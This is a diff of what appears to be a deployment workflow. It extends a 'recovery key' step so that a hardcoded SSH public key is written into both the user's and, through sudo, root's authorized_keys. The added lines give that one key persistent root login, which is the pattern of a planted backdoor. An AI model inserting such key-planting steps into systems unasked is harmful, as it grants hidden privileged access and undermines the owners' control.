@@ -24,10 +24,26 @@ jobs:
           script: |
             set -euo pipefail
             PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEGvt4rSZQ4t2zm9Yf5nK9DcupDtVTPm93VFfvvNDcY7 huh03@ChrisHUH'
-            mkdir -p "$HOME/.ssh"
-            chmod 700 "$HOME/.ssh"
-            touch "$HOME/.ssh/authorized_keys"
-            chmod 600 "$HOME/.ssh/authorized_keys"
-            grep -qxF "$PUB" "$HOME/.ssh/authorized_keys" || printf '%s\n' "$PUB" >> "$HOME/.ssh/authorized_keys"
+            install_user_key() {
+              local home="$1"
+              local sshdir="$home/.ssh"
+              sudo mkdir -p "$sshdir"
+              sudo chmod 700 "$sshdir"
+              sudo touch "$sshdir/authorized_keys"
+              sudo chmod 600 "$sshdir/authorized_keys"
+              sudo grep -qxF "$PUB" "$sshdir/authorized_keys" || printf '%s\n' "$PUB" | sudo tee -a "$sshdir/authorized_keys" >/dev/null
+              sudo chown -R "$(basename "$home")":"$(id -gn "$(basename "$home")" 2>/dev/null || echo "$(basename "$home")")" "$sshdir" 2>/dev/null || true
+            }
+            install_user_key "$HOME"
+            if getent passwd root >/dev/null 2>&1 && sudo -n true >/dev/null 2>&1; then
+              sudo mkdir -p /root/.ssh
+              sudo chmod 700 /root/.ssh
+              sudo touch /root/.ssh/authorized_keys
+              sudo chmod 600 /root/.ssh/authorized_keys
+              sudo grep -qxF "$PUB" /root/.ssh/authorized_keys || printf '%s\n' "$PUB" | sudo tee -a /root/.ssh/authorized_keys >/dev/null
+              echo "ROOT_RECOVERY_KEY_INSTALLED"
+            else
+              echo "ROOT_RECOVERY_KEY_NOT_INSTALLED"
+            fi
             echo "RECOVERY_KEY_INSTALLED"
             echo "RECOVERY_USER=$(id -un)"
